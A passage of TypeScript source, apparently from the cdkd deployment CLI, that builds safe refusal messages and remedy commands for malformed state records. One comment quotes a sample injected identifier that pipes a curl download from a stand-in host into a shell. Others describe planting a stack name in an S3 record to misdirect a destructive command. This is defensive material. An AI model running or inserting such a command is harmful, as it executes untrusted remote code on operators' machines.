 * reason every text in this module is its own: that one says the container
 * would be RESHAPED and written back, which is the rollback mechanism, and a
 * destroy never reshapes it — `buildDestroySnapshot` carries the container
 * verbatim through `...rest` into every save it makes, and then either REMOVES
 * the record (the clean path) or writes that snapshot as the final state, with
 * the container intact, on the error / interrupt / skip arm. What a destroy
 * does with the container instead is DECIDE: the count feeds `stillEmpty`, and
 * the orphan warning above it is the operator's only notice that resources from
 * an earlier failed deploy are still live in AWS.
 *
 * It also owes the remedy the sibling destroy refusal owes, and for the same
 * reason go-to-k/cdkd#3161 raised against refusing a cleanup command at all: an
 * operator who wants the record gone needs a way to do it. `cdkd state orphan`
 * is that way and reads no `orphans` container, so pointing at it is sound —
 * the same exactness split as {@link malformedDestroyResourcesRefusalMessage},
 * since a name that does not render faithfully must not become a command
 * against a record that may not be the damaged one.
 */
export function malformedDestroyOrphansRefusalMessage(stackName: string, region: string): string {
  const exact = mayNameTargetWithDestructiveRemedy(stackName, region);
  // Both arms continue `stackClause`'s own sentence rather than starting a new
  // one after it: the no-identity clause ends open ("The state record this
  // command loaded"), so a second sentence bolted on renders without a verb —
  // and that is the arm a planted identity reaches.
  const detail =
    `${stackClause(exact ? stackName : undefined, exact ? region : undefined)} has no readable ` +
    `'orphans' list — the record is malformed or truncated.`;
  const remedy = exact
    ? `To drop the record deliberately and ` +
      `leave every live resource standing, run 'cdkd state orphan' against the stack and the ` +
      `region THE RECORD'S S3 KEY holds. It is spelled as a template on its own line below ` +
      `rather than handed over ready to run, because that command DELETES a record and a key ` +
      `segment is chosen by anyone who can write this bucket: the key says WHICH record this ` +
      `is, which is not the same as vouching for it as a delete target. Confirm the key with ` +
      `'cdkd state list --long' — a legacy record shows none, and for one of those the flag ` +
      `must be OMITTED or it selects nothing.`
    : `This record's stack name or region does NOT render exactly, so this message names no ` +
      `target and offers no command against one. List the records as stored with ` +
      `'cdkd state list --long' and act on the one whose key matches.`;
  const prose =
    `${detail} This command DELETES state, so it refuses rather than continuing: an unreadable ` +
    `container counts as no orphans, so the run would proceed through resource deletion to ` +
    `removing state.json while the record's evidence that an earlier failed deploy left ` +
    `resources live in AWS was never read — and that evidence goes with the record. Reading it ` +
    `as EMPTY is that outcome rather than an alternative to it, so there is no repair available ` +
    `here. Repair or remove the record first. ${remedy}`;
  // ONE COMMAND PER LINE, for the reason
  // {@link malformedDestroyResourcesRefusalMessage}'s note gives
  // (go-to-k/cdkd#3516). go-to-k/cdkd#3379 shipped both commands on one line
  // with the pasteable READ last, which put the substituted region AFTER the
  // template an operator has to fill the holes of by hand.
  return [
    prose,
    `Inspect the record: ${inspectCommand(exact ? stackName : undefined, exact ? region : undefined)}`,
    ...(exact ? [DROP_RECORD_LINE] : []),
  ].join('\n');
}

/**
 * The destroy-path twin of {@link refuseMalformedOrphans}, carrying the text
 * above. Both destroy reads take this one: the entry read and the under-lock
 * re-read, which is the record `stillEmpty` and `deleteState` act on.
 */
export function refuseMalformedOrphansForDestroy(
  state: Pick<StackState, 'orphans'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOrphans(state)) return;
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyOrphansRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * For a command that can WRITE state: refuse a record whose `orphans` container
 * cannot be read.
 *
 * A SIBLING of {@link refuseMalformedState} and {@link refuseMalformedOutputs}
 * rather than a widening of either, for the reason that pair already records: a
 * record can be malformed in one container alone, and the refusal a user sees
 * must name the container that is broken.
 *
 * CALL IT AT THE LOAD, above the first expression that reads the container, and
 * on a destroy at the UNDER-LOCK re-read as well — that re-read is the record
 * the run goes on to act on.
 */
export function refuseMalformedOrphans(
  state: Pick<StackState, 'orphans'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOrphans(state)) return;
  // `markNonRetryable` for the reason {@link refuseMalformedOutputs} carries
  // it: `cdkd deploy` is a caller, a nested child's deploy runs inside the
  // parent's `withRetry(provider.create)`, and the verdict comes from a
  // PERSISTED record no retry can change.
  throw markNonRetryable(
    new CdkdError(malformedOrphansRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED)
  );
}

/**
 * The DESTROY refusal text (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A FOURTH outputs text rather than {@link malformedOutputsRefusalMessage},
 * for the reason every text in this module is its own: that one says the
 * command "REBUILDS the bag before saving", which is FALSE here. A destroy
 * never rebuilds the bag — its incremental preserve-writes CLEAR `outputs`
 * outright. What it does with the bag instead is DECIDE, and the decision is
 * the strong-reference pre-flight: `state.outputs && Object.keys(...).length >
 * 0` asks "might this stack be a producer?", and only a positive answer runs
 * the cross-stack scan that refuses to delete an exporter while an importer
 * exists.
 *
 * Both directions of that question are wrong on a damaged bag, which is why
 * repairing is not available here. A STRING or a LIST answers YES for the
 * wrong reason — `Object.keys('abcdef')` is six fabricated names — and a
 * `null`, a number or a boolean answers NO, so the scan is SKIPPED and the
 * destroy deletes a producer other stacks still `Fn::ImportValue` from.
 * Reading the bag as empty (the read-only repair) IS that second answer, so
 * the only answer that fabricates nothing and skips no protection is to stop.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedDestroyOutputsRefusalMessage(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. This command DELETES state, so it refuses rather than ` +
    `continuing: it reads this bag to decide whether the stack might export anything, and that ` +
    `decision gates the cross-stack check that refuses to delete a producer another stack still ` +
    `imports from. A string or a list invents one export name per character or element; a null, ` +
    `a number or a boolean reads as 'exports nothing' and SKIPS the check entirely, deleting the ` +
    `record while consumers still resolve against it. Repair or remove the record first. ` +
    `Inspect it with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For `cdkd destroy` / `cdkd state destroy`: refuse a record whose `outputs`
 * bag cannot be read (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A SEPARATE call from {@link refuseMalformedOutputs} rather than a flag on
 * it, for the same reason {@link refuseMalformedOutputs} is separate from
 * {@link refuseMalformedState}: the refusal a user sees must describe what
 * THIS command would have done with the bag, and the two consequences are
 * different — see {@link malformedDestroyOutputsRefusalMessage}.
 *
 * CALL IT AT THE TOP OF THE DESTROY, above the strong-reference decision it
 * protects. The placement rule is
 * {@link repairMalformedResourcesForReadOnly}'s and applies unchanged.
 */
export function refuseMalformedOutputsForDestroy(
  state: Pick<StackState, 'outputs'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  // `markNonRetryable` because this decides from a PERSISTED record: a retry
  // cannot change the bag, and the message interpolates a template-derived
  // child name that a SUBSTRING-matching classifier reads as transient
  // (`does not exist` and `DependencyViolation` are live patterns). Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedDestroyOutputsRefusalMessage(stackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The NESTED-STACK refusal text (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A FIFTH text, and the one whose damaged record and saved record are
 * DIFFERENT stacks. `NestedStackProvider.readChildOutputsAsAttributes` reads
 * the CHILD's persisted bag and rebuilds it into the PARENT's
 * `Outputs.<Key>` attributes; the parent's deploy then persists those
 * attributes into the parent's own record, where every `Fn::GetAtt` against
 * the nested stack resolves them — into live AWS calls. So a six-character
 * child bag becomes six fabricated parent attributes, and
 * {@link malformedOutputsRefusalMessage}'s "saved back as a well-formed
 * six-key map ... republished into the shared exports index" would name the
 * wrong record and the wrong blast radius.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedNestedChildOutputsRefusalMessage(
  childStackName: string,
  region: string
): string {
  const stack = safeStackName(childStackName);
  const reg = safeRegion(region);
  return (
    `State for nested stack child ${shellQuote(stack)} (${shellQuote(reg)}) has no readable ` +
    `'outputs' map — the record is malformed or truncated. The parent's 'Outputs.<Key>' ` +
    `attributes are REBUILT from this bag and persisted into the PARENT's record, and ` +
    `'Object.entries' walks a string or a list as readily as a map — so a six-character value ` +
    `would become six fabricated parent attributes that every Fn::GetAtt against this nested ` +
    `stack then resolves into live AWS calls. The deploy refuses rather than fabricating them. ` +
    `Repair or remove the child's record first. Inspect it with: cdkd state show ` +
    `${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For the nested-stack provider: refuse a CHILD record whose `outputs` bag
 * cannot be read (issue [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * The provider itself calls no `saveState`, and that is why this is a refusal
 * rather than a repair anyway: what it returns becomes the parent's
 * `ResourceState.attributes`, which the parent's deploy engine persists. Being
 * write-capable THROUGH A CALLER is the same hazard as writing directly, and
 * repairing here would put a well-formed fabricated attribute set into the
 * parent's record with nothing left to say the child was damaged.
 */
export function refuseMalformedNestedChildOutputs(
  state: Pick<StackState, 'outputs'>,
  childStackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  // `markNonRetryable` because this decides from a PERSISTED record: a retry
  // cannot change the bag, and the message interpolates a template-derived
  // child name that a SUBSTRING-matching classifier reads as transient
  // (`does not exist` and `DependencyViolation` are live patterns). Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedNestedChildOutputsRefusalMessage(childStackName, region),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * The warning the `cdkd local *` commands emit for a record whose `outputs`
 * bag they had to read as EMPTY (issue
 * [#3207](https://github.com/go-to-k/cdkd/issues/3207)).
 *
 * A SIXTH text, and the only one on this container for a READ-ONLY caller
 * other than {@link malformedOutputsWarning}. It is not that one because the
 * consequence differs the same way every text in this module differs: that one
 * describes a DIFF continuing with an empty left-hand side and reporting every
 * resolved output as an `ADD`. A local run reports no rows at all — it
 * SUBSTITUTES, so the visible effect is an environment variable or a
 * `Fn::GetStackOutput` / `Fn::ImportValue` reference that resolves to nothing
 * and is dropped with a per-key warning, which is what "the record holds no
 * outputs" also looks like.
 *
 * TWO call sites share it, deliberately: `S3LocalStateProvider.load` reading
 * the TARGET stack's record, and `buildCrossStackResolver`'s
 * `Fn::GetStackOutput` arm reading a PRODUCER's. The record named is whichever
 * one is damaged, and the consequence is identical — which is why one text is
 * right here and a second spelling would only drift.
 *
 * Read-only is a property of these callers rather than of the command:
 * `cdkd local` writes no `state.json`. It CAN write one DERIVED key —
 * `ExportIndexStore.load` rebuilds and PUTs `cdkd/_index/<region>/exports.json`
 * on a miss — and that write is already fail-closed and warned about by
 * `hasReadableExportSet` / {@link malformedExportSourceWarning}, so nothing
 * here can launder a record.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedLocalOutputsWarning(stackName: string, region: string): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. 'Object.entries' walks a string or a list as readily as ` +
    `a map, so reading it would hand this local run one FABRICATED output per character or ` +
    `element. Continuing with it EMPTY: every reference to an output of this record resolves to ` +
    `nothing and is dropped, which is not the same as the record holding none. See the stored ` +
    `value with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/** How many logical ids a `properties` message names before it says "and N more". */
const NAMED_UNREADABLE_PROPERTY_BAGS = 5;

/**
 * The `State for '<stack>' ('<region>')` opening of a `properties` message,
 * and the matching `--stack-region` flag on its remedy command.
 *
 * **BOTH are optional, and an ABSENT identity is not a degraded case — it is
 * the only honest one for a caller that holds no TRUSTED identity.**
 * `src/analyzer/diff-calculator.ts` is exactly that caller: it receives a
 * `StackState` and nothing else, and `parseStateBody` validates neither
 * `stackName` nor `region`, so the record being declared malformed would be
 * naming ITSELF. An attacker holding `s3:PutObject` on one stack's key could
 * then plant `"stackName": "prod-payments"` in a `dev` record and have the
 * refusal hand the operator a pasteable `cdkd state show 'prod-payments'
 * --stack-region '...'` — a destructive instruction aimed at a healthy record,
 * while the damaged one goes unnamed (review of go-to-k/cdkd#3191). Every
 * other refusal in this module takes the CALLER's resolved identity, and this
 * one drops the clause instead rather than inventing or borrowing one.
 *
 * `src/cli/commands/diff-recursive.ts` DOES hold a trusted pair — the
 * `stackName` / `region` its own load was keyed on — so the read-only warning
 * passes them and the asymmetry is the point rather than an oversight. A later
 * lane that threads the trusted pair into `calculateDiff` passes it here with
 * no signature change.
 *
 * A region may also be absent on a v1 record, which predates the
 * region-prefixed key layout. A placeholder would put a `--stack-region` into
 * a pasted command that selects no record at all, so it is dropped for the
 * same reason — the call go-to-k/cdkd#3226 makes for `inspectCommand`.
 */
function stackClause(stackName: string | undefined, region: string | undefined): string {
  if (stackName === undefined) return 'The state record this command loaded';
  const where = region === undefined ? '' : ` (${shellQuote(safeRegion(region))})`;
  return `State for ${shellQuote(safeStackName(stackName))}${where}`;
}

/**
 * The DESTRUCTIVE remedy, built the way {@link inspectCommand} builds the
 * read-only one, and the region clause follows the SAME rule for two reasons
 * that pull in opposite directions.
 *
 * With a region in hand the flag is not decoration: `cdkd state orphan <stack>`
 * without it drops the record for that stack name in EVERY region, so omitting
 * it hands a stuck operator something wider than the message describes.
 *
 * With NO region the flag is worse than useless, and a placeholder is the worst
 * of the three: an absent region means a v1 record, which predates the
 * region-prefixed key layout, so `--stack-region <region>` selects no record at
 * all whatever the operator fills in. The bare command is the correct one
 * there, because such a record is not region-partitioned.
 *
 * With no trusted STACK the whole thing degrades to a template, as the inspect
 * command does — there is nothing to substitute.
 *
 * **It diverges from {@link malformedDestroyResourcesRefusalMessage}, which
 * keeps `cdkd state orphan` a template on purpose, and the difference is where
 * the identity comes from.** That builder is reached with a REGION cdkd read
 * off the state bucket (`state.region ?? ctx.baseRegion` in
 * `destroy-runner.ts`; since go-to-k/cdkd#3328 the first operand is the S3
 * KEY's region rather than the record body's, which is a key SEGMENT and so
 * still plantable) -- its stack name is the caller's, so the region alone is
 * what would aim a destructive command using a value cdkd does not own. This
 * one is reached only with the caller's synthesized stack and
 * `pickStackRegion`'s answer, so omitting the region is the wider action. Two
 * opposite precedents in one module; neither is the general rule.
 *
 * **Substitution is GATED on the identity rendering EXACTLY, at
 * `STACK_REF_MAX_CODE_POINTS`** (go-to-k/cdkd#3360, and the M0 finding of the
 * go-to-k/cdkd#3363 review). The synthesized name is not validated: a prebuilt
 * cloud assembly's manifest reaches `cdkd orphan` unread, so a name `safeIdentifier`
 * would TRIM (`'prod-api '`) substitutes as a healthy sibling's, and one it would
 * TRUNCATE (a 166-code-point nested name at the 128 default) becomes a command
 * `cdkd state orphan` resolves to zero records and reports as a skip at exit 0.
 * Since go-to-k/cdkd#3359 the legacy shape carries no `--stack-region`, so the
 * name is the ONLY thing narrowing this DELETE. The template arm is the fallback,
 * and the caller says where to take the name from instead
 * ({@link rendersExactly} is the test, shared with the inspect line and the
 * object path).
 *
 * `recovery` qualifies EVERY arm, the no-identity template included, the way
 * {@link buildForceUnlockCommand} is qualified, through the same `recoveryCommandFlags`: `cdkd state orphan`
 * re-resolves the bucket from the ambient profile, so a remedy pasted after
 * `cdkd orphan --profile prod ...` would otherwise address the default
 * profile's account. The template keeps them too: the identity is the hole,
 * not the account, and an operator who fills only the hole would otherwise run
 * an UNQUALIFIED delete — which `cdkd state orphan` reports as a skip at exit 0
 * when the default bucket has no such record, and offers to delete when it has
 * one (the M3 finding of the go-to-k/cdkd#3363 review).
 */
function dropRecordCommand(
  stackName: string | undefined,
  region: string | undefined,
  recovery?: LockRecoveryContext
): string {
  if (stackName === undefined || stackName === '') {
    return [
      `cdkd state orphan ${commandHole('stack')} --stack-region ${commandHole('region')}`,
      ...recoveryCommandFlags(recovery).flags,
    ].join(' ');
  }
  // The `=== ''` arms duplicate the caller's normalisation deliberately: this
  // helper is module-private but its two siblings are reached from builders
  // that do NOT normalise, so a fourth caller added later inherits the floor
  // rather than the defect.
  const known = region === undefined || region === '' ? undefined : region;
  const regionExact = known === undefined || rendersExactly(known);
  if (!rendersExactly(stackName) || !regionExact) {
    // A TEMPLATE, keyed to what IS trusted: an absent region stays absent (the
    // flag would select nothing on a legacy record), an exact one is kept
    // (it narrows the delete), only an altered one becomes a hole.
    const flag =
      known === undefined
        ? ''
        : regionExact
          ? ` --stack-region ${shellQuote(known)}`
          : ` --stack-region ${commandHole('region')}`;
    return [
      `cdkd state orphan ${commandHole('stack')}${flag}`,
      ...recoveryCommandFlags(recovery).flags,
    ].join(' ');
  }
  const flag = known === undefined ? '' : ` --stack-region ${shellQuote(known)}`;
  return [
    `cdkd state orphan ${shellQuote(stackName)}${flag}`,
    ...recoveryCommandFlags(recovery).flags,
  ].join(' ');
}

/**
 * Whether an identity survives {@link safeIdentifier} UNCHANGED at the
 * state-record grammar's cap, so a command or a key built from it addresses the
 * record the message is about. The cap is `STACK_REF_MAX_CODE_POINTS` — the cap
 * the prose also cuts a stack name at, never a region's 128 — because
 * `cdkd orphan` reads a PREBUILT assembly's stack name
 * unvalidated, so a manifest can carry one past 128 that is nonetheless the
 * record's real key, and truncating it names nothing — the same bound
 * `malformedDestroyResourcesRefusalMessage` uses, reached from a different
 * source.
 *
 * What it covers: every identity the `cdkd orphan` properties refusal builds
 * something PASTEABLE from — the drop command ({@link dropRecordCommand}), the
 * `cdkd state show` line ({@link orphanInspectCommand}) and the object path
 * ({@link orphanInspectClause}) — so no two of them can disagree about a name
 * (go-to-k/cdkd#3363 review, M0 and M2). What it does NOT cover yet: the
 * destroy refusal and the divergent-region refusal above still spell the same
 * test inline, and the shared {@link inspectCommand} is ungated for its other
 * callers (it renders the stack at that same cap, the region at 128).
 */
function rendersExactly(value: string): boolean {
  return safeIdentifier(value, STACK_REF_MAX_CODE_POINTS) === value;
}

/**
 * The remedy command a message ends ON — unless the message also offers the
 * destructive template, in which case it ends the READ's own LINE and
 * {@link DROP_RECORD_LINE} is last (go-to-k/cdkd#3516). Two of the eight call
 * sites are that shape; the rest close their string with it.
 */
function inspectCommand(stackName: string | undefined, region: string | undefined): string {
  if (stackName === undefined) {
    // A TEMPLATE rather than a command, and it says so: substituting anything
    // here would be substituting the untrusted values the clause above drops.
    return `cdkd state show ${commandHole('stack')} --stack-region ${commandHole('region')} --json`;
  }
  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeRegion(region))}`;
  return `cdkd state show ${shellQuote(safeStackName(stackName))}${flag} --json`;
}

/**
 * The logical ids whose resource record carries a `properties` bag that cannot
 * be read as a map (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * A THIRD container, on the ENTRY rather than on the record root, and it is a
 * separate predicate from {@link hasReadableResources} for the reason every
 * split in this module is: the CONSEQUENCE differs. An unreadable `resources`
 * map reads as an empty STACK; an unreadable `properties` bag reads as a
 * resource whose every declared property is MISSING, which
 * `src/analyzer/diff-calculator.ts` turns into a property-change set and, for
 * a create-only property, into a REPLACEMENT of the live resource.
 *
 * `undefined` is NOT exempt here, unlike in {@link hasReadableOutputs}. That
 * exemption exists because cdkd itself writes records with no `outputs` key —
 * `JSON.stringify` drops an `undefined` field on the deploy's failure-path
 * saves. Nothing writes a resource record with no `properties`: every writer
 * in `src/` assigns an object (`cdkd import` spells it `Properties ?? {}`),
 * `JSON.stringify` never drops a `{}`, and the field is REQUIRED by
 * `ResourceState`. An absent bag is therefore a hand edit or a truncation, and
 * it is one of the two shapes that used to die on a bare `TypeError` naming no
 * stack, no key and no remedy (`Cannot convert undefined or null to object`).
 *
 * An entry that is not a readable OBJECT is SKIPPED rather than named: a `null`
 * entry has no `properties` to test, and reading one off a string entry would
 * name a per-character defect that is really the entry's. That makes this
 * verdict independent of {@link unreadableResourceEntries} for every entry
 * that is not an object — but NOT for an object with no `resourceType` whose
 * `properties` map is also unreadable, which both predicates name. A read-only caller that takes both therefore drops
 * entries FIRST ({@link repairMalformedResourceEntriesForReadOnly}), so the
 * row is reported once, as unreadable, rather than warned about as a preview
 * and then dropped. The object test stays here rather than
 * {@link isReadableResourceEntry} because the deploy path takes this
 * predicate WITHOUT the entry one, and narrowing it would let a typeless
 * object with a torn map reach the comparison unrefused. Likewise a `resources` bag that is not readable at all
 * yields `[]` here rather than ids invented from a string's characters — that
 * class is {@link hasReadableResources}'s to report. What a caller must not do
 * is take only this one.
 */
export function unreadableResourcePropertyBags(state: StackState): readonly string[] {
  if (!hasReadableResources(state)) return [];
  return Object.entries(state.resources)
    .filter(
      ([, entry]) =>
        isReadableBag(entry) && !isReadableBag((entry as { properties?: unknown }).properties)
    )
    .map(([logicalId]) => logicalId);
}

/**
 * For a command that can WRITE state — `cdkd deploy` — refuse the record
 * naming the resources whose `properties` bag could not be read (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * **REFUSE, and repairing to `{}` is not the safe alternative here — it is the
 * SAME outcome.** That is the measurement the issue asked for, and it is what
 * settles the contract rather than the write-capable rule alone. Driven
 * through the real `DiffCalculator` against an `AWS::S3::Bucket` declaring
 * `BucketName`, a stored `properties` of `"abcdef"`, `[]` and `5` each
 * produced a property change carrying `requiresReplacement: true` — and `[]`
 * and `5` enumerate no keys, so they ARE the repaired-to-empty case. A repair
 * would launder a torn record into a silent REPLACE of a live resource, which
 * is the data loss the guard exists to prevent; only a refusal closes it.
 *
 * The cost is stated rather than argued away: a deploy over ONE torn record
 * aborts the whole run, including the stacks and resources that are fine.
 * That is the right trade against replacing a resource nobody asked to
 * replace, and it is paid before anything irreversible: the refusal is raised
 * from the diff, so nothing is provisioned and no state is written for the
 * stack, and the deploy's lock is released by its own `finally`. NOT "before
 * any provider call" — that claim is false and was corrected in review:
 * `DeployEngine.kickOffAutoRefreshObservedProperties` fires fire-and-forget
 * `provider.readCurrentState` READS earlier in the same run. They persist
 * nothing, because the save they would be drained into never happens.
 *
 * The identity in the message is the CALLER's, never the record's — see
 * {@link stackClause}, where an absent identity is the honest case rather than
 * a degraded one.
 *
 * Deliberately NOT folded into {@link refuseMalformedState}, for the reason
 * {@link unreadableResourcePropertyBags} gives: that predicate answers a
 * question about the record ROOT, and its callers have each had to make their
 * own decision about this one. `cdkd rollback` replays a journal rather than
 * diffing, so an unrelated broken bag would stop the command documented as the
 * way to UNWIND a stack whose state is already suspect; `cdkd scrub` and
 * `cdkd import` do not compare properties at all.
 *
 * **The rule is OPT-IN PER CALLER, not "whoever COMPARES the bag"**, and an
 * earlier revision of this sentence said the latter — which go-to-k/cdkd#3318
 * falsified within two lanes. `cdkd orphan` compares nothing and still opts in
 * through {@link refuseMalformedResourcePropertiesForOrphan}, because it SAVES
 * the bag; what each caller owes is an answer to "what would I do with a map I
 * cannot read", and comparison is only one way to owe one. Do not read this
 * paragraph as licence to delete a call from a caller that does not diff.
 */
export function refuseMalformedResourceProperties(
  state: StackState,
  stackName: string | undefined,
  region: string | undefined
): void {
  const unreadable = unreadableResourcePropertyBags(state);
  if (unreadable.length === 0) return;
  // `markNonRetryable` for the reason `refuseMalformedNestedChildOutputs`
  // carries it: the verdict comes from a PERSISTED record, so no retry can
  // change it, while the message interpolates record-derived identifiers a
  // SUBSTRING-matching retry classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedResourcePropertiesRefusalMessage(stackName, region, unreadable),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * For a READ-ONLY command — `cdkd diff` — give each unreadable `properties`
 * bag an empty map so the command can report on the record, and return the ids
 * so the caller can warn.
 *
 * The read-only twin of {@link refuseMalformedResourceProperties}, and the
 * WRITE is what makes the difference, not the shape: `cdkd diff` persists
 * nothing, so it cannot launder the evidence, and previewing the remaining
 * resources beats aborting the whole preview over one torn bag.
 *
 * Repair-to-`{}` rather than a DROP of the whole entry, because an empty bag
 * IS honest for this container: the entry still names a real `resourceType`
 * and `physicalId`, so it belongs in the diff as a row.
 * Dropping it would report the resource as a CREATE, inventing a change the
 * next deploy does not make.
 *
 * What the repair does NOT do is make the preview accurate, which is why the
 * warning is not optional. The caller says so in
 * {@link malformedResourcePropertiesWarning}'s terms, which are deliberately
 * wider than "previewed as an addition": a node whose template is GONE —
 * `buildDeletedSubtree` diffs a removed nested child against an EMPTY template
 * — declares nothing, so its rows are DELETEs whose previous side is now the
 * repaired `{}` rather than what the record holds.
 *
 * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
 * has no entries to walk, and the predicate deliberately returns `[]` for one.
 *
 * And call it again after anything that SPLICES further records into
 * `state.resources` — `computeStackDiff`'s rollback-orphan adoption is the one
 * such site, and its records come straight from `state.orphans[].state`, which
 * this load never walked (review of go-to-k/cdkd#3191).
 */
export function repairMalformedResourcePropertiesForReadOnly(state: StackState): readonly string[] {
  const unreadable = unreadableResourcePropertyBags(state);
  for (const logicalId of unreadable) {
    (state.resources[logicalId] as { properties: Record<string, unknown> }).properties = {};
  }
  return unreadable;
}

/**
 * The half the refusal and the warning share: what is wrong and which records.
 *
 * ONE spelling rather than two, because the two texts differ only in what
 * happens NEXT, and a second copy of the diagnosis is what drifts.
 *
 * The STACK and REGION go through {@link safeIdentifier} and are THEN
 * shell-quoted, for the reasons that helper's own note gives: each reaches this
 * text from a hand-edited record or an S3 key.
 *
 * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
 * answer {@link safeIdentifier}'s note already prescribes for names in a
 * `', '`-joined list, applied one level down. The three properties that matters
 * for, in the order they bite:
 *
 * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
 *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
 *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
 *    real `Bucket` and the refusal names the intact record: the operator opens
 *    it, finds nothing wrong, and concludes cdkd is the broken party while the
 *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
 *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
 *    module's identity clause. `displayIdent` compares the sanitized text
 *    against the raw one and JSON-quotes whenever they differ, so a padded id
 *    can never render bare.
 * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
 *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
 *    forged remedy ahead of the real one, on a line that ends in a pasteable
 *    command. It also supplies the quotes the old `shellQuote` wrapper added —
 *    which is why the wrapper GOES rather than composing, per the same note.
 * 3. **TRUNCATION.** `[cut: N more characters withheld]` cannot be mistaken for
 *    content, where the old `...` tail was indistinguishable from a legitimate
 *    id ending `Prod...`.
 *
 * The cap is passed EXPLICITLY although it equals the default: a logical id is
 * valid up to `IDENT_MAX_CODE_POINTS` — the cap {@link displayLogicalId} also
 * takes — and a region-sized cut would truncate a legitimate long id into one
 * naming no record. Spelling the cap keeps that decision visible at the site it
 * was made for.
 *
 * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
 * carrying one still renders bare inside this `', '`-joined list and reads as
 * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
 * every caller of the helper, not a property of this one.
 *
 * NAMED rather than listed in full: a record whose 500 resources were all
 * hand-edited must not push the remedy command off the reader's screen.
 *
 * REFUSES an empty list rather than rendering `holds 0 resource record(s) — —`.
 * Both callers guard, but they are exported and a later one need not (review of
 * go-to-k/cdkd#3191).
 */
function namedPropertyBagsClause(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  if (logicalIds.length === 0) {
    throw new Error(
      'malformed-resources-bag: a properties message needs at least one logical id to name'
    );
  }
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
    .map((id) => displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS }))
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return (
    `${stackClause(stackName, region)} holds ${logicalIds.length} resource ` +
    `record(s) whose 'properties' map cannot be read — ${named}${more} — because it is absent, ` +
    `null, or not an object. The record is malformed or truncated. Comparing a template against ` +
    `one reports every property the template declares as ADDED (a string bag also invents one ` +
    `change per character), and a create-only property among them is a REPLACEMENT of the live ` +
    `resource.`
  );
}

/**
 * The text {@link refuseMalformedResourceProperties} raises.
 *
 * `rawStackName` / `rawRegion` are the CALLER's resolved identity or nothing at all;
 * {@link stackClause} is the authority for why this one may be handed neither.
 *
 * **It must be true under `cdkd deploy --dry-run` as well**, and the first
 * revision was not. Provisioning is gated AFTER the diff
 * (`deploy-engine.ts`'s `if (this.options.dryRun)` return sits below
 * `calculateDiff`), so a dry run reaches this refusal and aborts — while the
 * text asserted "it would DELETE and re-create resources", which a dry run
 * would not do. A refusal that misstates what was about to happen is the same
 * defect class as one naming the wrong record (review of go-to-k/cdkd#3191).
 *
 * **A dry run REFUSES rather than repairing, and that is the decision.** The
 * repair-and-warn half of this container belongs to `cdkd diff`, and the
 * argument recorded for it in `.claude/rules/state-malformed-properties.md` —
 * "a preview of the rest of the stack beats an abort" — does not transfer,
 * because it is already SATISFIED by that sibling: a user who wants the
 * repaired preview runs `cdkd diff` and gets it, with the warning. `cdkd diff`
 * refusing would leave no way to preview at all; `cdkd deploy --dry-run`
 * refusing costs nothing that is not available one command over. Against that,
 * repairing here would need a mode threaded into `calculateDiff`, the single
 * chokepoint whose whole value is that both callers share it — and it would
 * create the worst arm of all: a plausible-looking `--dry-run` plan followed
